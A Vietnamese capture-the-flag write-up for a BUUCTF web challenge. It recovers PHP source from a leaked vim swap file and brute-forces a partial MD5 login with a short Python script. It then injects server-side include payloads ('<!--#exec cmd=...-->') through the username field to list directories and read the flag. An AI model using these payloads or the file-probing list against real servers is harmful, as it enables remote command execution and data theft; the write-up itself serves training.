![image](https://github.com/Llam-a/BUUCTF/assets/115911041/789de156-c5ca-4a17-8904-a230f8a7d9d3)

Ban đầu có thử sqli nhưng mà ko cho ra kết quả gì mấy, nên mình đi scan file xem có gì mới không.Nhưng mà scan bằng dirsearch thì ko ra gì hết thì mình nghĩ là tempfile thôi.

```
.{PAGE}.php
{PAGE}.php.swp
.{PAGE}.php.swp
{PAGE}.php~
{PAGE}.phps
{PAGE}.bak
{PAGE}.tmp
{PAGE}.inc
```

Sau khi thử thì được 1 địa chỉ là index.php.swp. File .swp là file được tạo ra bởi các text editor trên linux như vim hay nano, chứa phiên bản recovery của file đang được mở. Và được source code như sau:

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

Để đăng nhập thì ta phải thỏa cái này

```php
 $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6))
```

Ta cẩn phải tìm 6 kí tự đầu của password mà đã md5 phải có giá trị bằng 6d0bc1, còn username thì sao cũng được

```python
import hashlib
for i in range(10000000):
    if hashlib.md5(str(i).encode('utf-8')).hexdigest()[0:6] == '6d0bc1':
        print(i)
//output: 9162671
```

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/a9d01fd8-8694-406f-b8ce-49fe9f74ce13)

Nhưng vẫn không được, nhưng để ý kĩ ở response có 1 header chứa file .shtml

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/bfb93f27-a802-4926-8902-0f7ec0f75a2c)

Nó in ra tên username ta dùng để đăng nhập.Khi ta đăng nhập thì username của ta sẽ được ghi vào file. shtml, theo đó nó thường đi theo với 1 lỗ hổng SSI.

https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection

Giở chỉ cần đồi username thành payload tấn công, mỗi username thì file shtml sẽ khác nhau
```
<!--#exec cmd="ls ../" -->
```
![image](https://github.com/Llam-a/BUUCTF/assets/115911041/4a451269-23da-4d33-942f-477869c48db4)

Có tên flag rồi bây giờ lấy flag thôi

```
<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2" -->
```

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/2bf48e8d-8c9d-410a-a39e-0759e3608582)

